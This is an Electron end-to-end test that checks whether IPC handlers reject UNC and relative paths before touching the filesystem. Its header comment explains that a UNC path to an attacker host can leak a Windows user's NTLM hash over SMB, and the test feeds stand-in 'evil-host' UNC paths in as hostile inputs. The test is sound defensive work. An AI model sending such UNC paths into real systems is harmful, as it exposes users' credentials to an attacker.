// E2E: UNC + non-absolute paths supplied to renderer-exposed IPC handlers
// MUST be rejected BEFORE main calls into `fs.*`. On Windows,
// `fs.existsSync('\\\\evil-host\\share\\probe')` triggers an SMB handshake
// that leaks the user's NTLM hash to whatever host the renderer named —
// a critical credential-leak primitive we never want to expose.
//
// Asserts:
//   1. `paths:exist` returns `false` for a UNC input. (Real fs would
//      reach out to the network; our isSafePath() filter shortcuts it.)
//   2. `paths:exist` still returns a real boolean for a benign absolute
//      local path (sanity — we didn't break the legitimate use case).
//   3. `commands:list` returns `[]` when handed a UNC cwd.
//
// We can't directly observe "no SMB packet went out" from a probe, but
// the fact that the call returns synchronously-ish with `false` for the
// UNC input proves the guard ran before any blocking fs roundtrip.

import { _electron as electron } from 'playwright';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';
import { fileURLToPath } from 'node:url';
import { appWindow, startBundleServer, isolatedUserData } from './probe-utils.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(__dirname, '..');

function fail(msg) {
  console.error(`\n[probe-e2e-ipc-unc-rejection] FAIL: ${msg}`);
  process.exit(1);
}

const { port: PORT, close: closeServer } = await startBundleServer(root);
const { dir: userDataDir, cleanup } = isolatedUserData('agentory-probe-unc');

const app = await electron.launch({
  args: ['.', `--user-data-dir=${userDataDir}`],
  cwd: root,
  env: {
    ...process.env,
    NODE_ENV: 'development',
    AGENTORY_DEV_PORT: String(PORT)
  }
});

try {
  const win = await appWindow(app);
  await win.waitForLoadState('domcontentloaded');
  await win.waitForFunction(() => !!window.agentory, null, { timeout: 15_000 });

  // Pick a real existing absolute local path for the sanity check.
  // process.cwd() in the renderer probe is a node concern, not the renderer's;
  // pass one we computed here.
  const benign = process.platform === 'win32' ? 'C:\\Windows' : '/tmp';
  const benignExists = fs.existsSync(benign);

  const result = await win.evaluate(async ({ benign }) => {
    const uncWin = '\\\\evil-host\\share\\probe';
    const uncPosix = '//evil-host/share/probe';
    const relativ = 'relative/path';
    const pathsRes = await window.agentory.pathsExist([uncWin, uncPosix, relativ, benign]);
    const cmdsUnc = await window.agentory.commands.list(uncWin);
    const cmdsPosixUnc = await window.agentory.commands.list(uncPosix);
    return { pathsRes, cmdsUnc, cmdsPosixUnc };
  }, { benign });

  // 1. paths:exist must return false for the unsafe inputs without touching fs.
  const uncWin = '\\\\evil-host\\share\\probe';
  const uncPosix = '//evil-host/share/probe';
  const relativ = 'relative/path';
  if (result.pathsRes[uncWin] !== false) {
    fail(`paths:exist for UNC ${uncWin} expected false, got ${result.pathsRes[uncWin]}`);
  }
  if (result.pathsRes[uncPosix] !== false) {
    fail(`paths:exist for // UNC expected false, got ${result.pathsRes[uncPosix]}`);
  }
  if (result.pathsRes[relativ] !== false) {
    fail(`paths:exist for relative path expected false, got ${result.pathsRes[relativ]}`);
  }
  // 2. Sanity: benign absolute path goes through to fs and reflects reality.
  if (result.pathsRes[benign] !== benignExists) {
    fail(
      `paths:exist for benign ${benign} expected ${benignExists}, got ${result.pathsRes[benign]} ` +
      `(guard may be over-eager and rejecting safe absolute paths)`
    );
  }
  // 3. commands:list must be an empty array for any UNC cwd.
  if (!Array.isArray(result.cmdsUnc) || result.cmdsUnc.length !== 0) {
    fail(`commands:list for UNC cwd expected [], got ${JSON.stringify(result.cmdsUnc)}`);
  }
  if (!Array.isArray(result.cmdsPosixUnc) || result.cmdsPosixUnc.length !== 0) {
    fail(`commands:list for // UNC cwd expected [], got ${JSON.stringify(result.cmdsPosixUnc)}`);
  }

  console.log('\n[probe-e2e-ipc-unc-rejection] OK');
  console.log('  UNC inputs to paths:exist + commands:list rejected before fs');
} finally {
  await app.close();
  closeServer();
  cleanup();
}
